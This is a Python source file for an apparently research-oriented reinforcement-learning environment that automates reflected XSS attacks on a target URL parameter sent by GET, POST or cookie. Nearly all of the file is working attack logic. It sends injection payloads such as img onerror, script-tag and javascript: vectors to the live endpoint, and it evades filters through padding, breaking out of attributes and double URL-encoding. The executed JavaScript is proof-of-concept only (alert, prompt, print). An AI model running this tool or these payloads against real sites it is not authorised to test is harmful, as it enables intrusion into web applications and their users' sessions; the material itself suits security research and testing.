from bs4 import BeautifulSoup
import sys, random, string, requests, re
import utils

# To add a new action: 
#  create a new method
#  add it to the self.actions dictionary in the states where it is allowed

# To add a new state:
#  add it to the self.states_name_to_location and self.states_location_to_name structures
#  add it to the self.action structure with its allowed actions
#  add the implementation in the resetPayload function
#  add the implementation in the goalCheck function
#  add the implementation in the goBack function 

class Enviroment:

    # Constructor that initiates the environment
    def __init__(self, argv):

        # Check user input
        self.url, self.method, self.parameter = utils.checkParameters(argv)
        
        # Initiliaze xss payload
        self.js = ""
        self.html = ""
        self.html_padding_sx=""
        self.html_padding_dx=""
        self.padding_sx = ""
        self.padding_dx = ""
        self.payload = ""
        self.validHtml = ""

        # Initiliaze xss trigger
        self.injection_point = ""
        self.expected_html = ""
        self.expected_html_padding_sx = ""
        self.expected_html_padding_dx = ""
        self.expected_js = ""
        self.expected = ""

        # States
        self.states_name_to_location = {
            "testReflection":0,
            "addPadding":1,
            "findValidHtml":2,
            "avoidHtmlFilters":3,
            "avoidJsFilters":4,
            "exploited":5
        }
        self.states_location_to_name= {
            0:"testReflection",
            1:"addPadding",
            2:"findValidHtml",
            3:"avoidHtmlFilters",
            4:"avoidJsFilters",
            5:"exploited"
        }
        self.n_states = len(self.states_name_to_location)

        # Actions
        self.actions = {
            self.states_name_to_location["testReflection"]: {
                0: self.actionNewTestString,
            },
            self.states_name_to_location["addPadding"]: {
                0: self.actionAddSxRandomChar,
                1: self.actionAddDxRandomChar
            },
            self.states_name_to_location["findValidHtml"]:{
                0: self.actionInjectionInTag,
                1: self.actionInjectionInAttribute
            },
            self.states_name_to_location["avoidHtmlFilters"]:{
                0: self.actionNewHtmlPayload,
                1: self.actionDubleEncode
            },
            self.states_name_to_location["avoidJsFilters"]:{
                0: self.actionNewJsPayload
            },
            self.states_name_to_location["exploited"]:{
                0: self.actionNewTestString
            }
        }

    # Return number of actions by state
    def getNumOfActions(self,state):
        if state >= 0 and state < len(self.states_name_to_location):
            return len(self.actions[state])

    # CONNECTION TO ENDPOINT

    # Request to endpoint 
    def checkConnection(self):
        #Connection
        response = self.connection(" ")

        # Handling exception
        if type(response) != requests.models.Response:
            print("{} error: {}".format(response["type"],response["msg"]))
            sys.exit(1)
        
        # No exception, so check status code
        else:
            if response.status_code in [200]:
                self.default_response_code=response.status_code
                print(self.connectionDetail())
            else:
                print("[!] Connection failed, http status code: {}".format(response.status_code))
                sys.exit(1)
    
    # Request to endpoint
    def connection(self, value):
        try:  
            if self.method == "GET":
                response = requests.get(
                    self.url,
                    timeout=5.0,
                    params={self.parameter: value}
                )
            elif self.method == "POST":
                response = requests.post(
                    self.url,
                    timeout=5.0,
                    data={self.parameter: value}  
                )
            elif self.method == "COOKIE":
                response = requests.get(
                    self.url,
                    timeout=5.0,
                    cookies={self.parameter: value}
                )
        except (requests.exceptions.Timeout):
            return {"type":"Connection","msg":"[!] Connection failed"}
        except requests.exceptions.HTTPError as err:
            return {"type":"Http","msg":err}
        except requests.exceptions.RequestException as err:
            return {"type":"Request","msg":err}

        # No exception, so return response
        return response

    # only connect if the html is syntactically valid
    def connectionIfHtmlValid(self, response):
        print("Local test: {}".format(response))
        if len(re.findall("<([^<>]*)>([^<>]*<img src=x onerror={}>[^<>]*)<([^<>]*)>",response)) > 0:
            return self.connection(self.payload)
        else:
            return ""

    # Print connection details 
    def connectionDetail(self,):
        return "\nUrl: {}\nMethod: {}\nParameter: {}\nResponse code: {}\n".format(self.url, self.method, self.parameter, self.default_response_code)

    # XSS EXPLOITATION

    # Build XSS payload and expected response
    def buildPayload(self):
        self.payload = self.padding_sx + self.html_padding_sx + str(self.html).replace("{}", self.js, 1) + self.html_padding_dx + self.padding_dx
        self.expected = self.expected_html_padding_sx + str(self.expected_html).replace("{}", self.expected_js, 1) + self.expected_html_padding_sx

    # Returns the tag into where the random string was injected
    def getInjectionPoint(self, response):
        soup = BeautifulSoup(response,features="lxml")
        for elem in soup(text=re.compile(self.expected)):
            self.injection_point = str(elem.parent).lower().replace(self.expected.lower(), "{}", 1)
            break

    # Execute action and return reward
    def doAction(self, state, action):
        print("\nState: {}\nAction: {}".format(self.states_location_to_name[state],self.actions[state][action].__name__))
        
        self.actions[state][action]()
        self.buildPayload()

        # Check if state is locally tested
        response = ""
        if state == self.states_name_to_location["findValidHtml"]:
            response = self.connectionIfHtmlValid(self.injection_point.lower().replace("{}",self.html,1))
        else:
            response = self.connection(self.payload)
        
        return self.goalCheck(state,response)

    # Checks if an XSS has been triggered
    def goalCheck(self, state, response):

        # DEBUG
        if response:
            print("Expected: {}\nResponce> {}".format(self.expected.lower(),response.text.lower()))
        else: 
            print("Local test: not valid HTML")
        # TEST REFLECTION STATE
        if self.states_location_to_name[state] == "testReflection":
            if self.expected.lower() in response.text.lower():
                print("[passed] payload: {}".format(self.payload))
                self.getInjectionPoint(response.text)
                return self.states_name_to_location["findValidHtml"], 100, False
            else:
                print("[filtered] payload: {}".format(self.payload))
                return self.states_name_to_location["addPadding"], -1, False

        # ADD PADDING STATE
        elif self.states_location_to_name[state] == "addPadding":
            if self.expected.lower() in response.text.lower() and self.payload.lower() not in response.text.lower():
                print("[passed] payload: {}".format(self.payload))
                self.getInjectionPoint(response.text)
                return self.states_name_to_location["findValidHtml"], 100, False
            elif self.payload.lower() not in response.text.lower():
                print("[filtered] payload: {}".format(self.payload))
                return self.states_name_to_location["addPadding"], 10, False
            else:
                print("[filtered] payload: {}".format(self.payload))
                return self.states_name_to_location["addPadding"], -1, False

        # FIND VALID HTML STATE
        elif self.states_location_to_name[state] == "findValidHtml":
            self.validHtml = self.html
            if response != "":
                if self.expected.lower() in response.text.lower():
                    print("[passed] payload: {}".format(self.payload))
                    return self.states_name_to_location["avoidJsFilters"], 100, False
                else:
                    print("[passed] payload: {}".format(self.payload))
                    return self.states_name_to_location["avoidHtmlFilters"], 100, False
            else:
                print("[filtered] payload: {}".format(self.payload))
                return self.states_name_to_location["findValidHtml"], -1, False

        # AVOID HTML FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidHtmlFilters":
            if self.expected.lower() in response.text.lower():
                print("[passed] payload: {}".format(self.payload))
                return self.states_name_to_location["avoidJsFilters"], 100, False
            else:
                print("[filtered] payload: {}".format(self.payload))
                return self.states_name_to_location["avoidHtmlFilters"], -1, False

        # AVOID JS FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidJsFilters":
            if self.expected.lower() in response.text.lower():
                print("[passed] payload: {}".format(self.payload))
                return self.states_name_to_location["exploited"], 100, True
            else:
                print("[filtered] payload: {}".format(self.payload))
                return self.states_name_to_location["avoidJsFilters"], -1, False

    # RESET AND GO BACK FUNCTIONS 

    # Roll back all actions done in this state
    def resetPayload(self, state):

        # TEST REFLECTION STATE
        if self.states_location_to_name[state] == "testReflection":
            self.html=""
        
        # ADD PADDING STATE
        elif self.states_location_to_name[state] == "addPadding":
            self.padding_dx = ""
            self.padding_sx = ""
        
        # FIND VALID HTML STATE
        elif self.states_location_to_name[state] == "findValidHtml":
            self.html = ""
        
        # AVOID HTML FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidHtmlFilters":
            self.html = self.validHtml

        # AVOID JS FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidJsFilters":
            self.js = ""

    # Go to the previous state, return the new state and a boolean indicating whether one has returned to the starting point
    def goBack(self, state):

        # TEST REFLECTION STATE
        if self.states_location_to_name[state] == "testReflection":
            return self.states_name_to_location["testReflection"], True
        
        # ADD PADDING STATE
        elif self.states_location_to_name[state] == "addPadding":
            return self.states_name_to_location["testReflection"], False
        
        # FIND VALID HTML STATE
        elif self.states_location_to_name[state] == "findValidHtml":
            return self.states_name_to_location["testReflection"], False
        
        # AVOID HTML FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidHtmlFilters":
            return self.states_name_to_location["findValidHtml"], False

        # AVOID JS FILTERS STATE 
        elif self.states_location_to_name[state] == "avoidJsFilters":
            return self.states_name_to_location["avoidHtmlFilters"], False

    # ACTIONS TEST REFLECTION

    def actionNewTestString(self):
        random_string = "".join((random.choice(string.ascii_letters) for i in range(10)))
        self.html = random_string
        self.expected_html = random_string
    
    # ACTIONS ADD PADDING

    def actionAddSxRandomChar(self):
        self.padding_sx += "".join(random.choices(string.ascii_letters, k=1))

    def actionAddDxRandomChar(self):
        self.padding_dx += "".join(random.choices(string.ascii_letters, k=1))

    # ACTIONS FIND VALID HTML

    def actionInjectionInTag(self):
        # set default html payload
        htmlPayload = "<img src=x onerror={}>"
        self.html = htmlPayload
        self.expected_html = htmlPayload

    def actionInjectionInAttribute(self):
        # find open tag
        tag = re.findall("<(\w*)",self.injection_point)
        if len(tag) > 0:
            tag = tag[0]
        else:
            tag = "p"
        
        # set html padding
        padding_sx = "\">"
        padding_dx = "< {} ".format(tag)
        self.html_padding_sx = padding_sx
        self.html_padding_dx = padding_dx
        self.expected_html_padding_sx = padding_sx
        self.expected_html_padding_dx = padding_dx
        
        # set default html payload
        htmlPayload = "<img src=x onerror={}>"
        self.html = htmlPayload
        self.expected_html = htmlPayload


    # ACTIONS AVOID HTML FILTERS

    def actionNewHtmlPayload(self):
        htmlPayloads = ["<SCRIPT>{}</SCRIPT>","<img src=javascript:{}>","<input onblur={} autofocus><input autofocus>"]
        htmlPayload = "".join(random.choices(htmlPayloads, k=1))
        self.html = htmlPayload
        self.expected_html = htmlPayload

    
    def actionDubleEncode(self):
        singleEncoding = {"<":"3C",">":"3E","/":"2F","\\":"5C","\"":"22","'":"27"}
        doubleEncoding = {"<":"253C",">":"253E","/":"252F","\\":"255C","\"":"2522","'":"2527"}
        for key in singleEncoding:
            self.html = self.html.replace(key, "%"+doubleEncoding[key])
            self.html_padding_sx = self.html_padding_sx.replace(key, "%"+doubleEncoding[key])
            self.html_padding_dx = self.html_padding_dx.replace(key, "%"+doubleEncoding[key])
            self.expected_html = self.expected_html.replace(key, "%"+singleEncoding[key])
            self.expected_html_padding_sx = self.expected_html_padding_sx.replace(key, "%"+singleEncoding[key])
            self.expected_html_padding_dx = self.expected_html_padding_dx.replace(key, "%"+singleEncoding[key])

    # ACTIONS AVOID JS FILTERS

    def actionNewJsPayload(self):
        jsPayloads = ["alert(1)","print()","alert(String.fromCharCode(49)","prompt(8)"]
        jsPayload = "".join(random.choices(jsPayloads, k=1))
        self.js = jsPayload
        self.expected_js = jsPayload